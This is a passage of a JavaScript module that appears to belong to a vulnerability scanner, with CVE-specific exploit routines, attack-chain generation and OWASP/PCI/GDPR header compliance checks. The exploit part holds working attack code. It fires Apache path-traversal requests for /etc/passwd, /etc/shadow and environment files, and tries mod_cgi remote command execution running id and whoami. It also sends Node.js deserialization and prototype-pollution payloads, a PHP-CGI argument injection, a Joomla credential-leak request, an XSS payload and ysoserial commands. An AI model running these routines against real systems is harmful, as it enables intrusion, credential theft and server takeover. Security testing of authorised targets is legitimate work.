                { ct: 'application/json', body: '{"__proto__":{"polluted":"true"}}', name: 'JSON proto pollution' },
                { ct: 'application/json', body: '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}', name: 'Node.js serialize RCE' },
            ];
            result.methods_tried = testPayloads.length;
            for (const tp of testPayloads) {
                try {
                    const res = await axios.post(targetUrl, tp.body, { timeout: 15000, validateStatus: () => true, headers: { 'Content-Type': tp.ct } });
                    const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data || '');
                    if (body.includes('uid=') || body.includes('root:') || res.status === 500) {
                        result.verified = true; result.methods_succeeded++;
                        result.payload = tp.name;
                        result.evidence = `Deserialization vulnerability! ${tp.name} caused unexpected server behavior (HTTP ${res.status}).`;
                        result.response_body = body.substring(0, 2000);
                        result.response_code = res.status;
                        break;
                    }
                } catch (e) {}
            }
            result.remediation = 'Never deserialize untrusted data.\nUse safe serialization formats (JSON without eval).\nImplement integrity checks on serialized data.';
            result.commands = `# Deserialization testing:\ncurl -X POST "${targetUrl}" -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"true"}}'\n\n# Java deserialization:\nysoserial CommonsCollections1 "id" > payload.bin\ncurl -X POST "${targetUrl}" --data-binary @payload.bin -H "Content-Type: application/x-java-serialized-object"`;
            return result;
        }

        // ═══════════════════════════════════════
        // KNOWN CVE (Multi-method verification)
        // ═══════════════════════════════════════
        if (vuln.cve_id?.startsWith('CVE-')) {
            const techName = (vuln.technology || '').toLowerCase();
            let body = '';
            let headers = {};
            let techConfirmed = false;
            let cveExploitWorked = false;
            const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36';

            // Helper: make a resilient GET with retries, timeout escalation, and HTTP/HTTPS fallback
            const resilientGet = async (url, opts = {}) => {
                const timeouts = [15000, 25000, 40000];
                const urls = [url];
                // Add protocol fallback
                if (url.startsWith('https://')) urls.push(url.replace('https://', 'http://'));
                else if (url.startsWith('http://')) urls.push(url.replace('http://', 'https://'));

                for (const tryUrl of urls) {
                    for (const t of timeouts) {
                        try {
                            return await axios.get(tryUrl, {
                                timeout: t,
                                validateStatus: () => true,
                                maxRedirects: 5,
                                headers: { 'User-Agent': UA, ...opts.headers },
                                ...opts,
                            });
                        } catch (e) {
                            // Continue to next timeout / URL
                        }
                    }
                }
                return null; // All attempts failed
            };

            // Helper: resilient POST
            const resilientPost = async (url, data, opts = {}) => {
                const timeouts = [15000, 25000, 40000];
                const urls = [url];
                if (url.startsWith('https://')) urls.push(url.replace('https://', 'http://'));
                else if (url.startsWith('http://')) urls.push(url.replace('http://', 'https://'));

                for (const tryUrl of urls) {
                    for (const t of timeouts) {
                        try {
                            return await axios.post(tryUrl, data, {
                                timeout: t,
                                validateStatus: () => true,
                                maxRedirects: 5,
                                headers: { 'User-Agent': UA, ...opts.headers },
                                ...opts,
                            });
                        } catch (e) {
                            // Continue to next timeout / URL
                        }
                    }
                }
                return null;
            };

            // ── Step 1: Initial reconnaissance (NON-BLOCKING — failures do NOT stop exploits) ──
            try {
                const res = await resilientGet(targetUrl);
                if (res) {
                    result.payload = `GET ${targetUrl}`; result.response_code = res.status;
                    body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data || '');
                    headers = res.headers || {};

                    if (techName && ((headers['server'] || '').toLowerCase().includes(techName) ||
                        (headers['x-powered-by'] || '').toLowerCase().includes(techName) ||
                        body.toLowerCase().includes(techName) ||
                        (headers['x-generator'] || '').toLowerCase().includes(techName))) {
                        techConfirmed = true;
                    }
                }
            } catch (e) {
                // Initial recon failed — that's fine, we still run ALL exploit paths below
                result.evidence = `Initial recon failed (${e.message}) — proceeding with direct exploit attempts...`;
            }

            // ── Step 2: CVE-Specific Active Exploit Attempts (ALWAYS runs) ──

            // ═ Apache CVE-2021-41773 / CVE-2021-42013: Path Traversal + RCE ═
            if (techName.includes('apache') && (vuln.cve_id === 'CVE-2021-41773' || vuln.cve_id === 'CVE-2021-42013')) {
                const apachePaths = [
                    // CVE-2021-41773 (Apache 2.4.49)
                    '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                    '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                    '/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                    '/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd',
                    // CVE-2021-42013 (Apache 2.4.49-2.4.50 double encoding bypass)
                    '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd',
                    '/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd',
                    '/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd',
                    '/cgi-bin/.%252e/.%252e/.%252e/.%252e/etc/passwd',
                    // More depth variations
                    '/cgi-bin/..%2f..%2f..%2f..%2f..%2fetc/passwd',
                    '/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                    '/cgi-bin/....//....//....//....//etc/passwd',
                    // /etc/shadow attempt
                    '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow',
                    '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shadow',
                    // /proc info
                    '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/proc/self/environ',
                    '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/proc/version',
                ];
                // RCE via mod_cgi
                const rceShellPaths = [
                    '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh',
                    '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh',
                    '/cgi-bin/.%252e/.%252e/.%252e/.%252e/bin/sh',
                ];
                const fileIndicators = ['root:', 'daemon:', 'nobody:', '/bin/bash', '/bin/sh', 'uid=', 'gid=', 'www-data', 'DOCUMENT_ROOT', 'SERVER_SOFTWARE', 'Linux version'];
                result.methods_tried = apachePaths.length + rceShellPaths.length;

                // Try file read paths
                for (const epath of apachePaths) {
                    const exploitRes = await resilientGet(`${targetUrl}${epath}`);
                    if (exploitRes) {
                        const eBody = typeof exploitRes.data === 'string' ? exploitRes.data : JSON.stringify(exploitRes.data || '');
                        const found = fileIndicators.find(ind => eBody.includes(ind));
                        if (found && exploitRes.status === 200) {
                            cveExploitWorked = true;
                            result.response_body = eBody;
                            result.payload = `GET ${targetUrl}${epath}`;
                            result.evidence = `${vuln.cve_id} EXPLOITED! Path traversal via "${epath}" — file content retrieved! Indicator: "${found}". ${eBody.length} bytes leaked.`;
                            result.response_code = 200;
                            break;
                        }
                    }
                }

                // Try RCE via shell paths if file read didn't work
                if (!cveExploitWorked) {
                    for (const spath of rceShellPaths) {
                        const exploitRes = await resilientPost(`${targetUrl}${spath}`, 'echo BUGFINDER_CVE_RCE_PROOF; id; cat /etc/passwd; whoami; uname -a; hostname', {
                            headers: { 'Content-Type': 'text/plain' }
                        });
                        if (exploitRes) {
                            const eBody = typeof exploitRes.data === 'string' ? exploitRes.data : '';
                            if (eBody.includes('BUGFINDER_CVE_RCE_PROOF') || eBody.includes('uid=') || eBody.includes('root:')) {
                                cveExploitWorked = true;
                                result.response_body = eBody;
                                result.payload = `POST ${targetUrl}${spath}`;
                                result.evidence = `${vuln.cve_id} RCE ACHIEVED! Remote code execution via mod_cgi at "${spath}". Command output received!`;
                                result.response_code = exploitRes.status;
                                break;
                            }
                        }
                    }
                }
            }

            // ═ WordPress CVE-2023-5561: User Enumeration ═
            if (techName.includes('wordpress') && vuln.cve_id === 'CVE-2023-5561') {
                const wpRes = await resilientGet(`${targetUrl}/wp-json/wp/v2/users`);
                if (wpRes) {
                    const eBody = typeof wpRes.data === 'string' ? wpRes.data : JSON.stringify(wpRes.data || '');
                    if (wpRes.status === 200 && (eBody.includes('"slug"') || eBody.includes('"name"'))) {
                        cveExploitWorked = true;
                        result.response_body = eBody;
                        result.payload = `GET ${targetUrl}/wp-json/wp/v2/users`;
                        result.evidence = `CVE-2023-5561 EXPLOITED! WordPress user data exposed via REST API! Usernames leaked for brute-force attacks.`;
                        result.response_code = 200;
                    }
                }
                if (!cveExploitWorked) {
                    // Try oEmbed
                    const oeRes = await resilientGet(`${targetUrl}/wp-json/oembed/1.0/embed?url=${targetUrl}`);
                    if (oeRes) {
                        const eBody = typeof oeRes.data === 'string' ? oeRes.data : JSON.stringify(oeRes.data || '');
                        if (eBody.includes('author_name')) {
                            cveExploitWorked = true;
                            result.response_body = eBody;
                            result.payload = `GET ${targetUrl}/wp-json/oembed/1.0/embed?url=${targetUrl}`;
                            result.evidence = `CVE-2023-5561 — Author name leaked via oEmbed endpoint!`;
                        }
                    }
                }
                result.methods_tried = 3;
            }

            // ═ WordPress CVE-2023-2982: Auth Bypass ═
            if (techName.includes('wordpress') && vuln.cve_id === 'CVE-2023-2982') {
                const wpAuthRes = await resilientPost(`${targetUrl}/wp-json/developer/v1/social_login`, JSON.stringify({ provider: 'facebook', token: 'test', user_id: '1' }), {
                    headers: { 'Content-Type': 'application/json' }
                });
                if (wpAuthRes && wpAuthRes.status !== 404) {
                    const eBody = typeof wpAuthRes.data === 'string' ? wpAuthRes.data : JSON.stringify(wpAuthRes.data || '');
                    if (eBody.includes('token') || eBody.includes('user') || wpAuthRes.status === 200) {
                        cveExploitWorked = true;
                        result.response_body = eBody;
                        result.payload = `POST ${targetUrl}/wp-json/developer/v1/social_login`;
                        result.evidence = `CVE-2023-2982 — Social Login endpoint accessible! Authentication bypass possible.`;
                    }
                }
                result.methods_tried = 2;
            }

            // ═ jQuery CVE-2020-11022/CVE-2020-11023: Check version on page ═
            if (techName.includes('jquery') && (vuln.cve_id === 'CVE-2020-11022' || vuln.cve_id === 'CVE-2020-11023')) {
                const jqVersionMatch = body.match(/jquery[\/\-]?v?(\d+\.\d+\.\d+)/i) || body.match(/jQuery v(\d+\.\d+\.\d+)/i) || body.match(/jquery\.min\.js\?ver=(\d+\.\d+\.\d+)/i);
                if (jqVersionMatch) {
                    const ver = jqVersionMatch[1];
                    const parts = ver.split('.').map(Number);
                    if (parts[0] < 3 || (parts[0] === 3 && parts[1] < 5)) {
                        cveExploitWorked = true;
                        result.evidence = `${vuln.cve_id} CONFIRMED! jQuery version ${ver} is vulnerable (fix: >= 3.5.0). XSS via htmlPrefilter/option injection possible.`;
                        result.payload = `Detected jQuery ${ver} in page source`;
                        result.response_body = `=== VULNERABLE JQUERY VERSION DETECTED ===\n\nVersion Found: ${ver}\nVulnerable Range: jQuery 1.0 to < 3.5.0\nFix Version: 3.5.0+\n\n=== PROOF ===\nMatched pattern: "${jqVersionMatch[0]}"\n\n=== XSS PAYLOAD (copy to browser console on target) ===\n$('<style><style/><img src=x onerror=alert(document.domain)>')\n\n=== DETECTION SCRIPT ===\n// Paste in browser console:\nconsole.log('jQuery version: ' + jQuery.fn.jquery);\nif (parseFloat(jQuery.fn.jquery) < 3.5) alert('VULNERABLE to ${vuln.cve_id}!');`;
                    }
                } else {
                    // Check for jQuery in script sources
                    const jqSrcMatch = body.match(/src=["'][^"']*jquery[^"']*["']/ig);
                    if (jqSrcMatch) {
                        result.evidence = `jQuery detected via script tag (${jqSrcMatch[0]}). Version could not be extracted — manual verification needed.`;
                        result.response_body = `jQuery references found:\n${jqSrcMatch.join('\n')}\n\n=== Manual check ===\nOpen browser console on target and run:\njQuery.fn.jquery`;
                    }
                }
                result.methods_tried = 2;
            }

            // ═ PHP CVE-2024-4577: CGI Argument Injection ═
            if (techName.includes('php') && vuln.cve_id === 'CVE-2024-4577') {
                const phpRes = await resilientGet(`${targetUrl}/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`);
                if (phpRes) {
                    const eBody = typeof phpRes.data === 'string' ? phpRes.data : '';
                    if (phpRes.status === 200 && eBody.length > 0) {
                        cveExploitWorked = true;
                        result.response_body = eBody;
                        result.payload = `GET ${targetUrl}/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`;
                        result.evidence = `CVE-2024-4577 — PHP-CGI argument injection endpoint responds! Potential RCE via php://input.`;
                    }
                }
                result.methods_tried = 2;
            }

            // ═ Joomla CVE-2023-23752: Config Leak ═
            if (techName.includes('joomla') && vuln.cve_id === 'CVE-2023-23752') {
                const joomlaRes = await resilientGet(`${targetUrl}/api/index.php/v1/config/application?public=true`);
                if (joomlaRes) {
                    const eBody = typeof joomlaRes.data === 'string' ? joomlaRes.data : JSON.stringify(joomlaRes.data || '');
                    if (eBody.includes('dbtype') || eBody.includes('password') || eBody.includes('secret')) {
                        cveExploitWorked = true;
                        result.response_body = eBody;
                        result.payload = `GET ${targetUrl}/api/index.php/v1/config/application?public=true`;
                        result.evidence = `CVE-2023-23752 EXPLOITED! Joomla config with database credentials leaked!`;
                    }
                }
                result.methods_tried = 2;
            }

            // ═ Apache CVE-2023-25690: Request Smuggling ═
            if (techName.includes('apache') && vuln.cve_id === 'CVE-2023-25690') {
                const smuggleRes = await resilientGet(targetUrl, {
                    headers: { 'Transfer-Encoding': 'chunked', 'Content-Length': '0' }
                });
                if (smuggleRes && smuggleRes.status !== 400) {
                    result.evidence = `Apache accepts requests with conflicting Transfer-Encoding + Content-Length headers. Potentially vulnerable to CVE-2023-25690 request smuggling.`;
                    result.response_body = `Status: ${smuggleRes.status}\nHeaders: ${JSON.stringify(smuggleRes.headers, null, 2)}`;
                }
                result.methods_tried = 2;
            }

            // ═ Determine final result based on actual exploitation ═
            if (cveExploitWorked) {
                // REAL exploitation succeeded — actual data retrieved
                result.verified = true;
                result.methods_succeeded = result.methods_succeeded || 1;
                result.exploit_type = 'Confirmed Exploit';
            } else if (techConfirmed) {
                // Technology detected but exploit didn't work — show USEFUL data not garbage
                result.verified = false;
                result.methods_succeeded = 0;
                // Build rich evidence from what we DID collect
                const headerDump = Object.entries(headers).filter(([k]) => !['connection','keep-alive','transfer-encoding','date','content-length'].includes(k)).map(([k,v]) => `  ${k}: ${typeof v === 'string' ? v : JSON.stringify(v)}`).join('\n');
                result.evidence = `Technology "${vuln.technology}" confirmed in response headers. ${vuln.cve_id} specific exploit payloads did not succeed — server is likely patched or running a non-vulnerable version.\n\nServer responded with HTTP ${result.response_code || 'N/A'}. The version may differ from what the CVE targets (CVSS: ${vuln.cvss_score}).`;
                result.response_body = `=== SERVER INTELLIGENCE GATHERED ===\n\nServer: ${headers['server'] || 'Hidden'}\nX-Powered-By: ${headers['x-powered-by'] || 'Hidden'}\nContent-Type: ${headers['content-type'] || 'Unknown'}\n\n=== ALL RESPONSE HEADERS ===\n${headerDump}\n\n=== ANALYSIS ===\nTechnology "${vuln.technology}" was detected, but the specific exploit for ${vuln.cve_id} did NOT extract data.\nThis means: The server is PATCHED or runs a different version.\n\n=== WHAT TO TRY NEXT ===\n1. Use "recon" command to discover hidden endpoints\n2. Try "attack" for full parameter fuzzing\n3. Use "weapon" for deep recon + data risk analysis\n4. Check the POC commands below for manual testing`;
            } else {
                // Neither tech confirmed nor exploit worked
                result.verified = false;
                result.evidence = `Technology "${vuln.technology}" NOT detected. Server headers: ${headers['server'] || 'Unknown'}. ${vuln.cve_id} is not applicable to this target.`;
                result.response_body = `=== NOT VULNERABLE ===\n\nTarget: ${targetUrl}\nExpected Technology: ${vuln.technology}\nDetected Server: ${headers['server'] || 'Unknown'}\nX-Powered-By: ${headers['x-powered-by'] || 'None'}\n\nThe vulnerability ${vuln.cve_id} does not apply to this target.`;
            }

            result.remediation = `Update ${vuln.technology} to latest version.\nSee: https://nvd.nist.gov/vuln/detail/${vuln.cve_id}`;
            result.commands = vuln.exploitation_guide || `# Verify ${vuln.cve_id}:\ncurl -sI ${targetUrl}\nnuclei -u ${targetUrl} -t cves/\nsearchsploit ${vuln.technology}`;
            return result;
        }

        // ═══════════════════════════════════════
        // DEFAULT: Generic multi-method
        // ═══════════════════════════════════════
        const res = await axios.get(targetUrl, { timeout: 15000, validateStatus: () => true });
        result.payload = `GET ${targetUrl}`; result.response_code = res.status; result.methods_tried = 1;
        result.verified = res.status < 400; result.methods_succeeded = result.verified ? 1 : 0;
        result.evidence = `Response: HTTP ${res.status}. Vulnerability: ${vuln.description?.substring(0, 200)}`;
        result.response_body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data || '');
        result.remediation = 'Apply security patches and follow hardening guidelines.';
        result.commands = `# Investigate:\ncurl -sI ${targetUrl}\ncurl -s ${targetUrl} | head -50`;
    } catch (e) {
        result.evidence = `Verification failed: ${e.message}`;
    }

    return result;
}

// ═══════════════════════════════════════
// Attack Chain Generation
// ═══════════════════════════════════════

export function generateAttackChains(vulns, subdomains, techStack) {
    const chains = [];
    const criticalVulns = vulns.filter(v => v.severity === 'critical');
    const sensitiveFiles = vulns.filter(v => v.vuln_type === 'Sensitive File Exposure');
    const headerVulns = vulns.filter(v => v.vuln_type === 'Missing Security Header');
    const infoDisclosure = vulns.filter(v => v.vuln_type === 'Information Disclosure');
    const xssVulns = vulns.filter(v => v.vuln_type?.includes('XSS') || v.cve_id?.includes('XSS'));
    const sqliVulns = vulns.filter(v => v.vuln_type === 'SQL Injection');
    const cookieVulns = vulns.filter(v => v.vuln_type === 'Cookie Security');
    const corsVulns = vulns.filter(v => v.vuln_type === 'CORS Misconfiguration');
    const takeoverVulns = vulns.filter(v => v.vuln_type === 'Subdomain Takeover');

    if (infoDisclosure.length > 0 || headerVulns.length > 0) {
        chains.push({
            name: 'Reconnaissance to Targeted Attack',
            steps: [`Enumerate ${subdomains.length} subdomains`, `Identify ${infoDisclosure.length} info disclosure issues`, `Map ${headerVulns.length} missing security headers`, 'Research version-specific exploits', 'Launch targeted attack'],
            impact: 'Attacker gains complete infrastructure knowledge for precise attacks.',
            severity: 'medium', risk_score: 45,
            linked_vulns: [...infoDisclosure, ...headerVulns].map(v => v.cve_id).slice(0, 10),
            prob: 85
        });
    }

    if (sensitiveFiles.length > 0) {
        chains.push({
            name: 'Sensitive File to Server Compromise',
            steps: [`Discover ${sensitiveFiles.length} exposed files`, 'Extract credentials from .env/config', 'Access database with stolen creds', 'Extract user data', 'Full server compromise'],
            impact: 'Complete backend compromise. All user data exposed.',
            severity: 'critical', risk_score: 95,
            linked_vulns: sensitiveFiles.map(v => v.cve_id),
            prob: 70
        });
    }

    if (sqliVulns.length > 0) {
        chains.push({
            name: 'SQL Injection to Data Exfiltration',
            steps: ['Identify injectable parameters', 'Extract DB schema via UNION', 'Dump user credentials', 'Crack password hashes', 'Login as admin', 'Upload web shell'],
            impact: 'Full database compromise, admin access, potential RCE.',
            severity: 'critical', risk_score: 98,
            linked_vulns: sqliVulns.map(v => v.cve_id), prob: 60
        });
    }

    if (xssVulns.length > 0 && cookieVulns.length > 0) {
        chains.push({
            name: 'XSS to Account Takeover',
            steps: ['Inject XSS payload', `Exploit ${cookieVulns.length} insecure cookies`, 'Steal session via document.cookie', 'Hijack admin session', 'Perform actions as compromised user'],
            impact: 'Account takeover of any user visiting XSS page.',
            severity: 'high', risk_score: 80,
            linked_vulns: [...xssVulns, ...cookieVulns].map(v => v.cve_id).slice(0, 10),
            prob: 65
        });
    } else if (xssVulns.length > 0) {
        chains.push({
            name: 'XSS to Credential Phishing',
            steps: ['Craft XSS payload with fake login', 'Inject via vulnerable parameter', 'Victim sees form on trusted domain', 'Capture credentials'],
            impact: 'Credential theft via phishing on trusted domain.',
            severity: 'high', risk_score: 70,
            linked_vulns: xssVulns.map(v => v.cve_id), prob: 55
        });
    }

    if (corsVulns.length > 0) {
        chains.push({
            name: 'CORS to Cross-Origin Data Theft',
            steps: ['Identify CORS wildcard', 'Create malicious site with JS', 'Victim visits while authenticated', 'Script makes cross-origin requests', 'Sensitive data exfiltrated'],
            impact: 'Cross-origin theft of authenticated user data.',
            severity: 'high', risk_score: 75,
            linked_vulns: corsVulns.map(v => v.cve_id), prob: 50
        });
    }

    if (takeoverVulns.length > 0) {
        chains.push({
            name: 'Subdomain Takeover to Phishing',
            steps: ['Identify dangling CNAME records', 'Register unclaimed resource', 'Deploy phishing page', 'Steal parent domain cookies', 'Intercept communications'],
            impact: 'Full subdomain control. Phishing with legitimate SSL.',
            severity: 'critical', risk_score: 90,
            linked_vulns: takeoverVulns.map(v => v.cve_id), prob: 75
        });
    }

    if (criticalVulns.length > 0) {
        chains.push({
            name: 'Known CVE to Remote Code Execution',
            steps: [`Identify ${criticalVulns.length} critical CVEs`, 'Download public exploit', 'Craft payload', 'Execute for RCE', 'Establish backdoor'],
            impact: 'Complete server compromise via known exploits.',
            severity: 'critical', risk_score: 95,
            linked_vulns: criticalVulns.map(v => v.cve_id).slice(0, 10),
            prob: criticalVulns.some(v => v.poc_available) ? 70 : 40
        });
    }

    if (headerVulns.length >= 3) {
        chains.push({
            name: 'Security Header Gaps Multi-Vector Attack',
            steps: [`Map ${headerVulns.length} missing headers`, 'Exploit missing X-Frame-Options for clickjacking', 'Exploit missing HSTS for SSL stripping', 'Exploit missing CSP for XSS', 'Chain attacks for max impact'],
            impact: 'Multiple attack vectors via poor header config.',
            severity: 'medium', risk_score: 55,
            linked_vulns: headerVulns.map(v => v.cve_id).slice(0, 10), prob: 70
        });
    }

    return chains;
}

// ═══════════════════════════════════════
// Compliance Checking
// ═══════════════════════════════════════

export function checkCompliance(headers, techStack, vulns = [], sslInfo = null) {
    const results = [];
    const h = headers || {};

    // ═══════════════════════════════════════
    // OWASP Top 10 — 2025 Edition
    // ═══════════════════════════════════════

    // A01:2025 — Broken Access Control (includes SSRF)
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A01:2025', category: 'Broken Access Control', check: 'CORS Configuration', status: h['access-control-allow-origin'] === '*' ? 'fail' : 'pass', details: h['access-control-allow-origin'] === '*' ? 'CORS wildcard allows any origin — data theft possible.' : 'CORS not set to wildcard.' });
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A01:2025', category: 'Broken Access Control', check: 'Directory Listing', status: vulns.some(v => v.cve_id === 'VULN-DIR-LISTING') ? 'fail' : 'pass', details: vulns.some(v => v.cve_id === 'VULN-DIR-LISTING') ? 'Directory listing enabled — file enumeration possible.' : 'No directory listing detected.' });
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A01:2025', category: 'Broken Access Control', check: 'SSRF Prevention', status: vulns.some(v => v.vuln_type === 'Open Redirect') ? 'warning' : 'pass', details: vulns.some(v => v.vuln_type === 'Open Redirect') ? 'Open redirect found — potential SSRF entry point.' : 'No SSRF indicators found.' });

    // A02:2025 — Security Misconfiguration
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A02:2025', category: 'Security Misconfiguration', check: 'Server Banner Hiding', status: h['server'] && !h['server'].includes('cloudflare') ? 'fail' : 'pass', details: h['server'] ? `Exposed: ${h['server']}` : 'Hidden.' });
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A02:2025', category: 'Security Misconfiguration', check: 'Technology Disclosure', status: h['x-powered-by'] ? 'fail' : 'pass', details: h['x-powered-by'] ? `X-Powered-By: ${h['x-powered-by']}` : 'Not disclosed.' });
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A02:2025', category: 'Security Misconfiguration', check: 'Sensitive Files Exposed', status: vulns.some(v => v.vuln_type === 'Sensitive File Exposure') ? 'fail' : 'pass', details: `${vulns.filter(v => v.vuln_type === 'Sensitive File Exposure').length} sensitive files exposed.` });

    // A03:2025 — Software Supply Chain Failures (NEW)
    const outdatedCVEs = vulns.filter(v => v.cve_id?.startsWith('CVE-'));
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A03:2025', category: 'Supply Chain Failures', check: 'Known CVEs in Dependencies', status: outdatedCVEs.length > 0 ? 'fail' : 'pass', details: `${outdatedCVEs.length} known CVEs in detected components.` });
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A03:2025', category: 'Supply Chain Failures', check: 'Outdated Components', status: outdatedCVEs.length > 3 ? 'fail' : outdatedCVEs.length > 0 ? 'warning' : 'pass', details: outdatedCVEs.length > 0 ? `${outdatedCVEs.length} components with vulnerabilities detected.` : 'No known vulnerable components.' });

    // A04:2025 — Cryptographic Failures
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A04:2025', category: 'Cryptographic Failures', check: 'HTTPS Enforcement (HSTS)', status: h['strict-transport-security'] ? 'pass' : 'fail', details: h['strict-transport-security'] ? `HSTS enabled: ${h['strict-transport-security']}` : 'HSTS missing — HTTPS not enforced.' });
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A04:2025', category: 'Cryptographic Failures', check: 'SSL/TLS Configuration', status: sslInfo ? (sslInfo.expired || sslInfo.selfSigned ? 'fail' : 'pass') : 'warning', details: sslInfo ? (sslInfo.expired ? 'Certificate expired!' : sslInfo.selfSigned ? 'Self-signed cert.' : `Valid TLS, ${sslInfo.protocol}`) : 'Could not verify SSL.' });
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A04:2025', category: 'Cryptographic Failures', check: 'Secure Cookies', status: vulns.some(v => v.cve_id === 'VULN-COOKIE-SECURE') ? 'fail' : 'pass', details: vulns.some(v => v.cve_id === 'VULN-COOKIE-SECURE') ? 'Cookies transmitted without Secure flag.' : 'Cookie encryption OK.' });

    // A05:2025 — Injection
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A05:2025', category: 'Injection', check: 'SQL Injection Protection', status: vulns.some(v => v.vuln_type === 'SQL Injection') ? 'fail' : 'pass', details: vulns.some(v => v.vuln_type === 'SQL Injection') ? 'SQL injection vulnerability detected!' : 'No SQL injection found.' });
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A05:2025', category: 'Injection', check: 'XSS Protection', status: vulns.some(v => v.vuln_type?.includes('XSS')) ? 'fail' : (h['content-security-policy'] ? 'pass' : 'warning'), details: vulns.some(v => v.vuln_type?.includes('XSS')) ? 'Cross-Site Scripting detected!' : (h['content-security-policy'] ? 'CSP present.' : 'No CSP — XSS risk elevated.') });

    // A06:2025 — Insecure Design
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A06:2025', category: 'Insecure Design', check: 'Security Headers Design', status: h['content-security-policy'] && h['x-frame-options'] && h['x-content-type-options'] ? 'pass' : 'fail', details: h['content-security-policy'] ? 'Security-by-design headers present.' : 'Missing security-by-design headers (CSP, X-Frame-Options).' });
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A06:2025', category: 'Insecure Design', check: 'Anti-Clickjacking', status: h['x-frame-options'] || (h['content-security-policy'] || '').includes('frame-ancestors') ? 'pass' : 'fail', details: h['x-frame-options'] ? `X-Frame-Options: ${h['x-frame-options']}` : 'No clickjacking protection.' });

    // A07:2025 — Authentication Failures
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A07:2025', category: 'Authentication Failures', check: 'Secure Cookie Flags', status: vulns.some(v => v.vuln_type === 'Cookie Security') ? 'fail' : 'pass', details: vulns.some(v => v.vuln_type === 'Cookie Security') ? 'Cookies missing security flags (HttpOnly, Secure, SameSite).' : 'Cookie flags OK.' });

    // A08:2025 — Software & Data Integrity Failures
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A08:2025', category: 'Integrity Failures', check: 'Subresource Integrity', status: 'warning', details: 'SRI verification requires browser-based testing.' });

    // A09:2025 — Security Logging & Alerting Failures
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A09:2025', category: 'Logging & Alerting Failures', check: 'Error Information Leakage', status: vulns.some(v => v.vuln_type === 'Information Disclosure') ? 'warning' : 'pass', details: vulns.some(v => v.vuln_type === 'Information Disclosure') ? 'Information disclosure may indicate verbose error logging.' : 'No verbose error leakage detected.' });

    // A10:2025 — Mishandling of Exceptional Conditions (NEW)
    results.push({ framework: 'OWASP Top 10:2025', category_id: 'A10:2025', category: 'Exceptional Conditions', check: 'Error Handling', status: vulns.some(v => v.vuln_type === 'SQL Injection') ? 'fail' : 'pass', details: vulns.some(v => v.vuln_type === 'SQL Injection') ? 'SQL errors leaked — improper exception handling.' : 'No evidence of exception mishandling.' });

    // PCI DSS
    results.push({ framework: 'PCI DSS', category_id: '4.1', category: 'Encrypt Transmission', check: 'HSTS Enforcement', status: h['strict-transport-security'] ? 'pass' : 'fail', details: h['strict-transport-security'] ? 'HSTS enforces encryption.' : 'HSTS missing.' });
    results.push({ framework: 'PCI DSS', category_id: '6.5', category: 'Secure Development', check: 'Injection Flaws', status: vulns.some(v => v.vuln_type === 'SQL Injection' || v.vuln_type?.includes('XSS')) ? 'fail' : 'pass', details: 'Apps must be protected against injection flaws.' });
    results.push({ framework: 'PCI DSS', category_id: '6.6', category: 'Web App Security', check: 'WAF or Code Review', status: techStack.some(t => (t.tech_name || t.name || '').toLowerCase().includes('cloudflare') || (t.tech_category || t.type || '').includes('WAF')) ? 'pass' : 'warning', details: 'WAF or regular code reviews required.' });

    // GDPR
    results.push({ framework: 'GDPR', category_id: 'Art. 5', category: 'Data Protection', check: 'Data-in-Transit Encryption', status: h['strict-transport-security'] ? 'pass' : 'fail', details: 'Personal data must be encrypted in transit.' });
    results.push({ framework: 'GDPR', category_id: 'Art. 25', category: 'Data Protection by Design', check: 'Security Headers', status: h['content-security-policy'] && h['x-frame-options'] ? 'pass' : 'warning', details: 'Security-by-design requires proper headers.' });
    results.push({ framework: 'GDPR', category_id: 'Art. 32', category: 'Security of Processing', check: 'Sensitive Data Exposure', status: vulns.some(v => v.severity === 'critical') ? 'fail' : 'pass', details: vulns.some(v => v.severity === 'critical') ? 'Critical vulns expose data.' : 'No critical exposure.' });
    results.push({ framework: 'GDPR', category_id: 'Art. 6', category: 'Lawfulness', check: 'Cookie Consent', status: 'warning', details: 'Cookie consent banner requires browser-based verification.' });

    return results;
}

// ═══════════════════════════════════════
